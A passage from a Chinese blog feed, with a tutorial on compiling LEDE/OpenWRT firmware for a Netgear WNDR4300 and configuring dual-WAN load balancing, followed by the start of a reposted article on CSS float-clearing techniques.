    <content type="html"><![CDATA[<p>家里一直屯着两根网线，一根是低价优惠时期买的长城，另一根是旧的贵价联通。由于一些历史原因，这联通的线路经常不稳定，会莫名其妙的挂掉，一直以来当联通线路挂掉的时候，就要手动拔掉联通的网线，换成长城的，然后又要进路由器改一番 PPPoE 的拨号配置，实在是烦，看到 OpenWRT 这么强大，突发奇想的要不干脆把路由器的一个 LAN 口拿出来，当成 WAN 来用，两个口都进行拨号，经过查了一番资料之后，感觉这个东西可行，就开始折腾了，不过中途一直没有找到自己想要的固件，于是打算自己编译一份，于是就这样掉进了 OpenWRT 的坑，折腾了两个星期之后终于成功的弄出来了。<br><a id="more"></a></p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>写这篇文章的时候 OpenWRT 18.06 才刚出不久，感觉不太成熟，笔者还是选择了用 Lean 大的 LEDE 8.x 来进行编译。  </p><p>Lean 大的 LEDE 仓库地址：<a href="https://github.com/coolsnowwolf/lede" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/coolsnowwolf/lede</a>  </p><p>起初在自己电脑 macOS 上进行编译，怎么编译都编译不通过，首先是 macOS 的文件系统 hfs 有大小写不敏感的问题，接着又是编译过程中的一些包有 macOS 环境的兼容性问题。  </p><p>所以后来笔者为了避免编译环境差异造成这些不必要的麻烦，去找了个 Docker 的编译环境，才成功地编译了出来，在这里感谢 <a href="http://www.right.com.cn/forum/forum.php?mod=viewthread&amp;tid=256137" rel="external nofollow noopener noreferrer" target="_blank">@timiil</a> 提供的 Docker 镜像。  </p><h2 id="预备措施"><a href="#预备措施" class="headerlink" title="预备措施"></a>预备措施</h2><p>由于笔者是选择了腾讯云的 CentOS 服务器来进行编译操作，所以还需要再服务器上先安装 Docker，至于 Docker 怎么安装，由于不同环境下方法不同，在此本文不做详述，仅提供一篇 <a href="https://docs.docker.com/install/linux/docker-ce/centos/#install-from-a-package" rel="external nofollow noopener noreferrer" target="_blank">教程</a> 作为参考。</p><h2 id="启动-Docker-实例"><a href="#启动-Docker-实例" class="headerlink" title="启动 Docker 实例"></a>启动 Docker 实例</h2><p>安装好 Docker 之后，需要先拉取用于编译 LEDE 的 Docker 镜像<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull timiil/coolsnowwolf-lede-builder</span><br></pre></td></tr></table></figure></p><p>然后创建并启动一个 Docker 实例，并挂载实例内的镜像输出目录 <code>/lede/bin</code> 到本地的 <code>~/lede_output</code> 目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -v ~/lede_output:/lede/bin timiil/coolsnowwolf-lede-builder</span><br></pre></td></tr></table></figure></p><h2 id="更新-git-库"><a href="#更新-git-库" class="headerlink" title="更新 git 库"></a>更新 git 库</h2><p>由于 Lean 大的 github 仓库是经常更新的，而 timiil 的 docker 镜像没有随之更新，所以进入到 docker 实例内后会发现里面的代码不是最新的代码，这会导致编译时的一些错误，所以这里需要手动更新一下代码，确保当前的代码跟 Lean 大仓库内的代码是同步的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure></p><h2 id="安装编译工具"><a href="#安装编译工具" class="headerlink" title="安装编译工具"></a>安装编译工具</h2><p>为确保编译工作能够正常进行，也需要把编译所需的工具安装一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install build-essential subversion libncurses5-dev zlib1g-dev gawk gcc-multilib flex git-core gettext libssl-dev unzip</span><br></pre></td></tr></table></figure></p><h2 id="初始化-LEDE-的编译目录"><a href="#初始化-LEDE-的编译目录" class="headerlink" title="初始化 LEDE 的编译目录"></a>初始化 LEDE 的编译目录</h2><p>1、创建一份 feeds.conf<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp feeds.conf.default feeds.conf</span><br></pre></td></tr></table></figure></p><p>2、更新本地的包索引列表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/feeds update -a</span><br></pre></td></tr></table></figure></p><p>3、将本地的包更新到最新版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/feeds install -a</span><br></pre></td></tr></table></figure></p><p>PS：如果中途 freeswitch 或者其他包报错，可以删掉重装一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./scripts/feeds uninstall freeswitch</span><br><span class="line">./scripts/feeds install -a</span><br></pre></td></tr></table></figure></p><h2 id="配置-LEDE-编译目标"><a href="#配置-LEDE-编译目标" class="headerlink" title="配置 LEDE 编译目标"></a>配置 LEDE 编译目标</h2><p>打开配置菜单<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></p><p>笔者仅需要用于 WNDR4300，故在此已 WNDR4300 为例进行配置  </p><pre><code>Target System =&gt; Atheros AR7xxx/AR9xxxSubtarget =&gt; Generic devices with NAND flashTarget Profile =&gt; NETGEAR WNDR4300v1Target Images =&gt; Root filesystem images =&gt; squashfsLuCI =&gt; Applications =&gt; 把自己需要的东西勾上LuCI =&gt; Themes =&gt; 可以勾个 materialLuCI =&gt; Modules =&gt; Translations =&gt; 勾上 Chinese</code></pre><p>配好之后保存一下就行了  </p><p>PS：Target Profile 找不到的话可以在 OpenWRT wiki 上把路由器型号输进去，然后 wiki 会有这个提示。  </p><p>附：<a href="https://wiki.openwrt.org/toh/netgear/wndr4300" rel="external nofollow noopener noreferrer" target="_blank">WNDR4300 说明</a>  </p><h2 id="修改-WNDR4300-的-mtd-分布，充分利用路由器的-flash"><a href="#修改-WNDR4300-的-mtd-分布，充分利用路由器的-flash" class="headerlink" title="修改 WNDR4300 的 mtd 分布，充分利用路由器的 flash"></a>修改 WNDR4300 的 mtd 分布，充分利用路由器的 flash</h2><p>由于 OpenWRT 官方给的 WNDR4300 的 mtdlayout 只划分了 32M，WNDR4300 的 flash 实际上有 128M，所以这里最好修改一下编译时的 mtdlayout，这样可以充分利用我们的 flash 空间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./target/linux/ar71xx/image/</span><br><span class="line">cp legacy.mk legacy.mk.bak</span><br><span class="line">vi legacy.mk</span><br></pre></td></tr></table></figure><p>找到这一段  </p><blockquote><p>wndr4300_mtdlayout=mtdparts=ar934x-nfc:256k(u-boot)ro,256k(u-boot-env)ro,256k(caldata),512k(pot),2048k(language),512k(config),3072k(traffic_meter),2048k(kernel),<strong>23552k</strong>(ubi),<strong>25600k</strong>@0x6c0000(firmware),256k(caldata_backup),-(reserved)  </p></blockquote><p>改为（将 ubi 和 firmware 增加 96M，完全使用 128M flash）  </p><blockquote><p>wndr4300_mtdlayout=mtdparts=ar934x-nfc:256k(u-boot)ro,256k(u-boot-env)ro,256k(caldata)ro,512k(pot),2048k(language),512k(config),3072k(traffic_meter),2048k(kernel),<strong>121856k</strong>(ubi),<strong>123904k</strong>@0x6c0000(firmware),256k(caldata_backup),-(reserved)  </p></blockquote><p>改完后记得保存退出</p><h2 id="执行编译"><a href="#执行编译" class="headerlink" title="执行编译"></a>执行编译</h2><p>配置好之后可以直接执行编译<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup make V=99 &amp;   <span class="comment"># 编译的日志会输出到 nohup.out</span></span><br></pre></td></tr></table></figure></p><p>也可以在此之前先 <code>make download</code> 一下，把需要的 dl 包先下载下来（有时可能会需要能访问外网的网络环境），接着再 <code>make V=99</code>，听说这样会快一些。  </p><p>这样就可以慢慢地等它编译完，自己先干别的事情去了，第一次编译要几个小时是正常的。  </p><p>PS：docker 可以用 <code>ctrl+p</code> 然后 <code>ctrl+q</code> 操作，直接从容器里面退出来而不中断容器。然后再用 <code>docker attach $id</code> 重新进入实例之后，按下 enter 键，如果 make 编译执行完了会有 <code>Done</code> 的提示。  </p><h1 id="刷入固件"><a href="#刷入固件" class="headerlink" title="刷入固件"></a>刷入固件</h1><p>编译完之后，在本机挂载的 <code>~/lede_output/targets/ar71xx/nand</code> 目录下，看到编译完成的 <code>openwrt-ar71xx-nand-wndr4300-ubi-factory.img</code> 文件，我们只要这个文件就行了，把它拿出来。</p><h2 id="tftp-刷入固件"><a href="#tftp-刷入固件" class="headerlink" title="tftp 刷入固件"></a>tftp 刷入固件</h2><p>由于刷入 img 固件需要 tftp 工具，需要先找个有 tftp 的环境  </p><h3 id="Windows-环境"><a href="#Windows-环境" class="headerlink" title="Windows 环境"></a>Windows 环境</h3><p>1、Windows 下的话 tftp 客户端默认是没有安装的，需要先在 <code>控制面板 &gt; 程序 &gt; 程序和功能 &gt; 打开或关闭 Windows 功能</code> 里面勾选 <code>TFTP 客户端</code>，然后按确定。这样在命令行里面才能调用它。  </p><p>2、用牙签或者粗针或者笔头按住路由器背面红色的 reset 键，重启路由器，直到路由器进入绿灯闪烁状态之后再松开 reset 键  </p><p>3、在 Windows 下手工把网卡的 IP 配成 192.168.1.11，然后在 cmd 下去 <code>ping 192.168.1.1</code>，能够 ping 通才能进行下一步操作</p><p>4、然后在 Windows 下的 cmd 命令行里面输入<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> PUT c:\<span class="built_in">path</span>\to\openwrt-ar71xx-nand-wndr4300-ubi-factory.img</span><br></pre></td></tr></table></figure></p><p>把上面的路径改成 img 文件所在的路径即可  </p><p>5、上传完后路由器会自动安装固件并重启，这时把前面手工配的 IP 地址改回 DHCP 分配。当路由器第一次重启完后，若能 ping 通 192.168.1.1 的话，先别急着进入路由器，要先拔掉路由器电源线，再插回去重启一遍，等 5G 的灯亮了再进行后面的操作，不然 5G wifi 可能会打不开。</p><h3 id="macOS-环境"><a href="#macOS-环境" class="headerlink" title="macOS 环境"></a>macOS 环境</h3><p>操作基本跟 Windows 环境相同，只是刷 tftp 的时候，所用的命令会有所不同<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tftp</span><br><span class="line">tftp&gt; connect 192.168.1.1</span><br><span class="line">tftp&gt; mode binary</span><br><span class="line">tftp&gt; put /path/to/openwrt-ar71xx-nand-wndr4300-ubi-factory.img</span><br><span class="line">tftp&gt; quit</span><br></pre></td></tr></table></figure></p><p>同样的，把上面的路径改成 img 的实际路径即可</p><p>安装完成后，登录 LuCI 的面板 <a href="http://192.168.1.1" rel="external nofollow noopener noreferrer" target="_blank">http://192.168.1.1</a>，初始用户名为 <code>root</code>，初始密码为 <code>password</code></p><h1 id="配置多线多拨"><a href="#配置多线多拨" class="headerlink" title="配置多线多拨"></a>配置多线多拨</h1><p>安装好 LEDE 之后，别的 wifi 什么的配置就不多说了，这些都没有什么问题，这里要解决的是多线多拨的问题，一开始我在这里卡了很久，折腾了半天终于给弄出来了。</p><h2 id="给交换机划分-vlan"><a href="#给交换机划分-vlan" class="headerlink" title="给交换机划分 vlan"></a>给交换机划分 vlan</h2><p>在 <code>网络 =&gt; 交换机</code> 中添加一行新的 vlan<br><img src="/images/2018/10/switch_config.png" alt="">  </p><p>把 CPU 列设成 “已标记”，把需要转 WAN 的 LAN 口改成 “未标记”。<br>然后 VLAN 1 上对应的端口也要设为 “关”  </p><p>PS：这里端口状态“未标记”(untagged)，即该端口作为本 VLAN 成员，进行二层交换；若选择“已标记”(tagged)，端口之间通信无二层交换，而是冲突广播（hub 方式）  </p><h2 id="添加接口配置"><a href="#添加接口配置" class="headerlink" title="添加接口配置"></a>添加接口配置</h2><p>在 <code>网络 =&gt; 接口</code> 中添加新的接口配置<br><img src="/images/2018/10/add_interface.png" alt=""></p><p>然后建好接口后把 PPPoE 的用户名和密码自己填上<br>接着给这个接口新增一个防火墙域叫’wanb’ 的<br><img src="/images/2018/10/add_firewall_area.png" alt="">  </p><p>接着要给不同的接口配置不同的跃点数，避免路由失效<br><img src="/images/2018/10/wan_metric.png" alt=""><br><img src="/images/2018/10/wanb_metric.png" alt="">  </p><h2 id="配置防火墙域"><a href="#配置防火墙域" class="headerlink" title="配置防火墙域"></a>配置防火墙域</h2><p>在 <code>网络 =&gt; 防火墙</code> 中把对应的规则也给添加进去<br><img src="/images/2018/10/firewall_config.png" alt="">  </p><h2 id="配置-MWAN-负载均衡"><a href="#配置-MWAN-负载均衡" class="headerlink" title="配置 MWAN 负载均衡"></a>配置 MWAN 负载均衡</h2><p>接着在 <code>网络 =&gt; 负载均衡</code> 给配置一下 MWAN3 的相关配置<br>由于我给接口起的名字是 wanb，MWAN3 默认就有这个配置，所以相关的配置工作量也就减少了<br>启用接口：<br><img src="/images/2018/10/active_mwan_interface.png" alt="">  </p><p>最后，根据自己的需要，在规则这边选择规则，我这里我这里选择了 wan 优先的策略<br><img src="/images/2018/10/mwan_policy.png" alt="">  </p><h2 id="修改-MAC-地址"><a href="#修改-MAC-地址" class="headerlink" title="修改 MAC 地址"></a>修改 MAC 地址</h2><p>由于新增的 eth0.3 没有配置 MAC 地址，所以新增接口会沿用 eth0 的 MAC 地址，导致 MAC 地址冲突，所以这里还要加一个步骤，就是给 eth0.3 配置 MAC 地址  </p><p>PS：可在命令行中输入 <code>ip a show</code> 查看本地的所有 MAC 地址</p><p>ssh 进入路由器<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure></p><p>打开网络配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/config/network</span><br></pre></td></tr></table></figure></p><p>在 wanb 的配置前面添加以下配置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config device &apos;wanb_dev&apos;</span><br><span class="line">        option name &apos;eth0.3&apos;</span><br><span class="line">        option macaddr &apos;c0:ff:d4:b3:64:f7&apos;</span><br></pre></td></tr></table></figure></p><p>保存退出，然后重启 eth0.3 接口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifdown wanb</span><br><span class="line">ifup wanb</span><br></pre></td></tr></table></figure></p><p>配完之后最好重启一下路由器，再看看 <code>状态 =&gt; 概览</code>，如果有两个 IPv4 的上游就说明配置成功了，这样子就解决了 MAC 地址冲突带来的问题<br><img src="/images/2018/10/mwan_statistic.png" alt="">  </p><p>整个多线多拨到这里就算实现了  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;家里一直屯着两根网线，一根是低价优惠时期买的长城，另一根是旧的贵价联通。由于一些历史原因，这联通的线路经常不稳定，会莫名其妙的挂掉，一直以来当联通线路挂掉的时候，就要手动拔掉联通的网线，换成长城的，然后又要进路由器改一番 PPPoE 的拨号配置，实在是烦，看到 OpenWRT 这么强大，突发奇想的要不干脆把路由器的一个 LAN 口拿出来，当成 WAN 来用，两个口都进行拨号，经过查了一番资料之后，感觉这个东西可行，就开始折腾了，不过中途一直没有找到自己想要的固件，于是打算自己编译一份，于是就这样掉进了 OpenWRT 的坑，折腾了两个星期之后终于成功的弄出来了。&lt;br&gt;
    
    </summary>
    
      <category term="日常运维" scheme="https://hexo.bangz.me/categories/%E6%97%A5%E5%B8%B8%E8%BF%90%E7%BB%B4/"/>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Linux基础" scheme="https://hexo.bangz.me/tags/Linux%E5%9F%BA%E7%A1%80/"/>
    
      <category term="操作系统" scheme="https://hexo.bangz.me/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="OpenWRT" scheme="https://hexo.bangz.me/tags/OpenWRT/"/>
    
  </entry>
  
  <entry>
    <title>清除浮动的四种方式及其原理理解</title>
    <link href="https://hexo.bangz.me/archives/principle-of-clear-float-in-four-ways.html"/>
    <id>https://hexo.bangz.me/archives/principle-of-clear-float-in-four-ways.html</id>
    <published>2018-08-14T13:37:10.000Z</published>
    <updated>2018-08-15T02:40:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>转自：<a href="https://juejin.im/post/59e7190bf265da4307025d91" rel="external nofollow noopener noreferrer" target="_blank">https://juejin.im/post/59e7190bf265da4307025d91</a></p><p>本文介绍了四种清除浮动的方法，并尝试解释其原理。在理解了各种清除浮动的原理之后，你会发现，很多清除浮动的方法本质上其实是一样的。掌握这些原理，相信你可以根据场景和需求，灵活运用原则发展出不同的清除浮动的方法，而不再死记或拘泥于文中提到的方法。</p><a id="more"></a><h1 id="一、为什么要清除浮动"><a href="#一、为什么要清除浮动" class="headerlink" title="一、为什么要清除浮动"></a>一、为什么要清除浮动</h1><p>在讲清除浮动的方法之前，我们先来了解一下为什么要清除浮动，清除浮动的目的是什么，即，要解决什么样的问题。来看一个浮动的例子(略去了文字内容)：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"topDiv"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"floatDiv"</span>&gt;</span>float left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"textDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bottomDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>其样式为：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.topDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid black;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.floatDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> dotted red;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.bottomDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> dotted black;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.textDiv</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid blue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 chrome 中渲染的效果如下图所示：<br><img src="/images/2018/08/2af797ffc0918352ac8d381994ff1a27.webp" alt=""></p><p>这肯定不是我们想要的渲染效果，它可能存在如下问题：</p><ol><li>文字围绕浮动元素排版，但我们可能希望文字（<code>.textDiv</code>）排列在浮动元素下方，或者，我们并不希望 <code>.textDiv</code> 两边有浮动元素存在。</li><li>浮动元素排版超出了其父级元素（<code>.topDiv</code>），父元素的高度出现了塌缩，若没有文字高度的支撑，不考虑边框，父级元素高度会塌缩成零。</li><li>浮动元素甚至影响到了其父元素的兄弟元素（<code>.bottomDiv</code>）排版。因为浮动元素脱离了文档流，<code>.bottomDiv</code> 在计算元素位置的时候会忽略其影响，紧接着上一个元素的位置继续排列。</li></ol><p>解决第一个问题，需要清除 <code>.textDiv</code> 周围的浮动，而解决第二个问题，因为父元素的兄弟元素位置只受父元素位置的影响，就需要一种方法将父级元素的高度撑起来，将浮动元素包裹在其中，避免浮动元素影响父元素外部的元素排列。</p><p>接下来开始介绍清除浮动的方法。</p><h1 id="二、清除浮动的方法"><a href="#二、清除浮动的方法" class="headerlink" title="二、清除浮动的方法"></a>二、清除浮动的方法</h1><h2 id="1-利用-clear-样式"><a href="#1-利用-clear-样式" class="headerlink" title="1. 利用 clear 样式"></a>1. 利用 clear 样式</h2><p>还是开篇的例子，我们给需要清除浮动的元素添加如下样式：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.textDiv</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid blue;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">clear</span>: left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>清除浮动后的渲染效果如下：<br><img src="/images/2018/08/23e815f13d70590629b3a9d2020b955b.webp" alt=""></p><p>解释一下：  </p><p>通过上面的样式，<code>.textDiv</code> 告诉浏览器，我的左边不允许有浮动的元素存在，请清除掉我左边的浮动元素。然而，因为浮动元素（<code>.floatDiv</code>）位置已经确定，浏览器在计算 <code>.textDiv</code> 的位置时，为满足其需求，将 <code>.textDiv</code> 渲染在浮动元素下方，保证了 <code>.textDiv</code> 左边没有浮动元素。同时可以看出，父元素的高度也被撑起来了，其兄弟元素的渲染也不再受到浮动的影响，这是因为 <code>.textDiv</code> 仍然在文档流中，它必须在父元素的边界内，父元素只有增加其高度才能达到此目的，可以说是一个意外收获。(<code>clear</code> 的值为 <code>both</code> 也有相同的效果，通俗理解就是，哪边不允许有浮动元素，<code>clear</code> 就是对应方向的值，两边都不允许就是 <code>both</code>)<br>但是，如果我们把 HTML 中的 <code>.floatDiv</code> 和 <code>.textDiv</code> 交换一下位置呢？<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"topDiv"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"textDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"floatDiv"</span>&gt;</span>float left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bottomDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>无论 <code>.textDiv</code> 是否应用清除浮动，情况都是下面的样子：</p><p><code>.textDiv</code> 的位置先确定了，于是浮动元素就紧接着 <code>.textDiv</code> 下方渲染在父元素的左侧。然而，父元素的高度并没有被撑起来，没有将浮动影响“内化”，导致浮动影响到了接下来的元素排版。<br>看来，为达到撑起父元素高度的目的，使用 <code>clear</code> 清除浮动的方法还是有适用范围的。我们需要更加通用和可靠的方法。<br>（这里澄清一下，单从元素清除浮动的角度，<code>clear</code> 完全已经达到了目的，它已经使得 <code>.textDiv</code> 特定的方向上不再有浮动元素，清除浮动其实仅仅针对需要清除浮动的元素本身而言，只关注自身需求是否达到，和外界没有什么关系，它不关注浮动是否超出父元素，以及浮动是否影响到后续元素排列。我们只是利用了浮动的一些特性达到某些目的，但这不是清除浮动关心的问题，只不过，相对于清除浮动，我们可能更加关心这些特性能为我们做些什么而已。我的理解是，清除浮动和撑起父元素高度其实是两个不同的问题，在这里，可以简单地理解为工具和目的之间的关系，接下来要讨论的两个方法都是在利用清除浮动这个工具在解决问题，它并不是清除浮动这个工具本身。不过，我们经常将两者混为一谈。sorry，有点啰嗦，看不懂就是我没表达清楚，跳过即可。。。）</p><h2 id="2-父元素结束标签之前插入清除浮动的块级元素"><a href="#2-父元素结束标签之前插入清除浮动的块级元素" class="headerlink" title="2. 父元素结束标签之前插入清除浮动的块级元素"></a>2. 父元素结束标签之前插入清除浮动的块级元素</h2><p>HTML 结构如下，在有浮动的父级元素的末尾插入了一个没有内容的块级元素 div：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"topDiv"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"textDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"floatDiv"</span>&gt;</span>float left<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"blankDiv"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"bottomDiv"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>应用样式：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.topDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid black;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.floatDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> dotted red;</span><br><span class="line">    <span class="attribute">color</span>: red;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.bottomDiv</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> dotted black;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.textDiv</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: blue;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">2px</span> solid blue;</span><br><span class="line">&#125;</span><br><span class="line">// 区别在这里</span><br><span class="line"><span class="selector-class">.blankDiv</span> &#123;</span><br><span class="line">    clear: both; // or left</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>渲染效果如下：<br><img src="/images/2018/08/7e3621e15592ac42f86c70734fe4e1dc.webp" alt=""></p><p>原理无需多讲，和第一个例子里 